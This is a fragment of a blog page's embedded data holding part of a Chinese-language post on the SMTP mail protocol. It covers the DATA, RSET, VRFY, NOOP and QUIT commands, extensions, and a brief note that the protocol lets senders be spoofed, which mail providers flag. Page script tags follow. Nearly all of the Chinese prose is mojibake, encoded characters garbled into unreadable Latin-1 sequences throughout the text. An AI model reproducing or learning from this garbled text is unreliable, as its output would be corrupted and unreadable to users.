(å¯å¤šæ¬¡é‡å¤å£°æ˜ï¼Œå³å°†ä¸€å°ä¿¡ä»¶å¤åˆ¶å¤šæ¬¡æŠ•é€ç»™æ¯æ¬¡å£°æ˜çš„å¯¹è±¡)\nç›¸å½“äºæ™®é€šä¿¡ä»¶çš„æ”¶ä¿¡äººã€‚ä¸è¿‡ä¹Ÿæœ‰ç‚¹åŒºåˆ«ï¼Œæ¯•ç«Ÿæ™®é€šä¿¡ä»¶æ²¡æ³•ä¸€ä»¶å¤šå‘å˜›ã€‚\u003c/li\u003e\n\u003cli\u003eDATA:\n\u003ccode\u003eDATA\u003c/code\u003e ä¹‹ååˆ° \u003ccode\u003e\u0026#x3C;CR\u003e\u0026#x3C;LF\u003e.\u0026#x3C;CR\u003e\u0026#x3C;LF\u003e\u003c/code\u003e ä¹‹å‰çš„æ‰€æœ‰å†…å®¹éƒ½ä½œä¸ºé‚®ä»¶çš„æ­£æ–‡å†…å®¹ã€‚ç­‰åŒäºæ™®é€šä¿¡ä»¶ä¿¡å°å†…çš„ä¿¡çº¸(å½“ç„¶äº†ï¼Œä¿¡çº¸ä¸Šåœ¨å†™ä¸Š \u003ccode\u003eTo XXX:\u003c/code\u003e \u003ccode\u003eYours XXX\u003c/code\u003e ä¹Ÿæ˜¯å¾ˆæ­£å¸¸çš„å˜›)ï¼Œç±»ä¼¼çš„ä¹Ÿå°±æ˜¯ DATA æ•°æ®ä¸­ä¹Ÿå¯ä»¥åŒ…æ‹¬ \u003ccode\u003eSubject:\u003c/code\u003e (ä¸»é¢˜), \u003ccode\u003eFrom:\u003c/code\u003e (å†™ä¿¡äºº), \u003ccode\u003eDate:\u003c/code\u003e (æ—¥æœŸ), \u003ccode\u003eTo:\u003c/code\u003e(æ”¶ä»¶äºº)ç­‰å†…å®¹ã€‚\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch3\u003eå‡ ä¸ªæ¬¡è¦çš„ SMTP äº¤äº’æŒ‡ä»¤\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eRSET: (Reset)\né‡ç½®ï¼Œä¸¢å¼ƒä¹‹å‰é’ˆå¯¹é‚®ä»¶æ‰€æè¿°çš„æ‰€æœ‰å†…å®¹ï¼Œé‡æ–°å¼€å§‹ã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eVRFY: (VERIFY)\nç”¨äºç¡®è®¤æ”¶ä»¶äººæ˜¯å¦å­˜åœ¨ï¼Œä»¥åŠæ”¶ä»¶äººçš„å®Œæ•´åœ°å€\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eNOOP:\nå¼ºåˆ¶æœåŠ¡å™¨åšå‡ºä¸€ä¸ªå›åº”ï¼Œæ²¡æœ‰å®é™…æ„ä¹‰ã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eQUIT:\nè¦æ±‚æ”¶ä¿¡æœåŠ¡å™¨è¿”å›ä¸€ä¸ªé‚®ä»¶æ¥æ”¶æˆåŠŸçš„ä¿¡å·ï¼Œä¹‹åé‡Šæ”¾è¿æ¥é€šé“ã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003eSMTP æ‰©å±•\u003c/h2\u003e\n\u003cp\u003eå‰é¢æè¿°äº†è¿™ä¹ˆå¤šï¼Œåº”è¯¥æ¥è¯´æ‰¾ä¸€äº›æ”¯æŒ TCP (æˆ–è€…å…¶ä»–ç¨³å®šçš„ä¼ è¾“å±‚è¿æ¥ä¹Ÿæ˜¯å¯ä»¥çš„) è¿æ¥çš„å‘½ä»¤å°±å®Œå…¨å¯ä»¥æ”¯æŒä¸€æ¬¡é‚®ä»¶å‘é€çš„éœ€æ±‚ã€‚\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯ï¼Œå¦‚æœæƒ³è¦å‘é€ä¸€äº›ä¸­æ–‡å­—ç¬¦ä¹‹ç±»çš„ï¼Œé©¬ä¸Šå°±å‡ºç°äº†é—®é¢˜ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™é‡Œæœ‰å‡ ç§æ–¹å¼ï¼Œä½†æœ¬äººè¿˜æ²¡æœ‰ç†è§£é€å½»ã€‚ä»…åˆ—å‡ºçŸ¥é“çš„å¯è¡Œæ–¹æ¡ˆã€‚\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eé€šè¿‡ IMF (Internet Message Format) è¿›è¡Œå‘ä»¶\u003c/li\u003e\n\u003cli\u003eé€šè¿‡ ESMTP \u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003eSMTP å®‰å…¨\u003c/h2\u003e\n\u003cp\u003eå‡ºäº SMTP æœ¬èº«åè®®çš„è®¾è®¡ï¼Œæ²¡æœ‰ä¸€ä¸ªæœ‰æ•ˆçš„èº«ä»½è®¤è¯æœºåˆ¶ã€‚\u003c/p\u003e\n\u003cp\u003eçºµä½¿é€šè¿‡ \u003ccode\u003eMAIL FROM: \u0026#x3C;A@test.net\u003e\u003c/code\u003e åœ¨ä¿¡å°ä¸Šå†™æ˜äº†æ˜¯ç”± A å‘å‡ºçš„ä¿¡ä»¶ã€‚\nä½†æ˜¯ï¼Œè£…åœ¨ä¿¡å°å†…çš„ä¿¡çº¸å´å¯ä»¥å±ä¸Šå¦ä¸€ä¸ªäººçš„åå­—ã€‚\u003c/p\u003e\n\u003cp\u003eåˆ©ç”¨è¿™ç§è§„åˆ™ï¼Œä¹Ÿå°±å‡ºç°äº†ä¼ªè£…å‘ä¿¡äººè¿™æ ·çš„æ“ä½œã€‚å½“ç„¶ï¼Œç°åœ¨çš„å¤§é‡é‚®ç®±æœåŠ¡æä¾›å•†éƒ½ä¼šå¯¹è¿™ç§æƒ…å†µè¿›è¡Œæ ‡è®°ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://ws1.sinaimg.cn/large/006tNc79gy1fvpbzedf67j315e01q0sp.jpg\" alt=\"â€œä»£å‘â€æ ‡è®°\"\u003e\u003c/p\u003e\n\u003ch2\u003eå‚è€ƒ\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\u003ca href=\"https://tools.ietf.org/html/rfc821\"\u003eSIMPLE MAIL TRANSFER PROTOCOL\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"http://www.ruanyifeng.com/blog/2008/06/mime.html\"\u003eMIME\u003c/a\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"language-plain\"\u003e  __                    __                  \n / _| __ _ _ __   __ _ / _| ___ _ __   __ _ \n| |_ / _` | '_ \\ / _` | |_ / _ \\ '_ \\ / _` |\n|  _| (_| | | | | (_| |  _|  __/ | | | (_| |\n|_|  \\__,_|_| |_|\\__, |_|  \\___|_| |_|\\__, |\n                 |___/                |___/ \n\u003c/code\u003e\u003c/pre\u003e","digest":"\u003cp\u003eåœ¨ç½‘ç»œåè®®ä¸Šï¼Œé«˜å±‚åè®®ç¡®å®æ¯”åº•å±‚åè®®æ›´å®¹æ˜“ç†è§£ï¼Œä¹Ÿæ›´åŠ çš„äººæ€§åŒ–ã€‚\nä¼ è¾“å±‚çš„ TCP, UDP éƒ½è¿˜åœç•™åœ¨å„ç§å­—èŠ‚å†…å®¹çš„æ•´åˆå’Œæ ¡éªŒä¸Šï¼Œè€Œæ›´ä¸Šå±‚çš„åº”ç”¨å±‚åè®®å°±å·²ç»èƒ½å¤Ÿç›´è§‚åˆ°é€šè¿‡ç›´æ¥è§£è¯»å°±èƒ½ç†è§£å…¶æ¯æ¡æ¶ˆæ¯çš„å«ä¹‰äº†ã€‚\u003c/p\u003e"}],"items":36,"pages":4,"currentPage":1},"buildId":"hWdi76oEOpYyIRDBQu5ce","dynamicBuildId":false,"assetPrefix":"https://www.ffutop.com/blog","nextExport":true}</script><script async="" id="__NEXT_PAGE__/" src="https://www.ffutop.com/blog/_next/static/hWdi76oEOpYyIRDBQu5ce/pages/index.js"></script><script async="" id="__NEXT_PAGE__/_app" src="https://www.ffutop.com/blog/_next/static/hWdi76oEOpYyIRDBQu5ce/pages/_app.js"></script><script src="https://www.ffutop.com/blog/_next/static/runtime/webpack-8ed9452df514b4d17d80.js" async=""></script><script src="https://www.ffutop.com/blog/_next/static/chunks/commons.969aa7fdf03e14118a99.js" async=""></script><script src="https://www.ffutop.com/blog/_next/static/chunks/styles.f3603d0a56c82c4f5e78.js" async=""></script><script src="https://www.ffutop.com/blog/_next/static/runtime/main-3daabeb1dde7624c7fe0.js" async=""></script></body></html>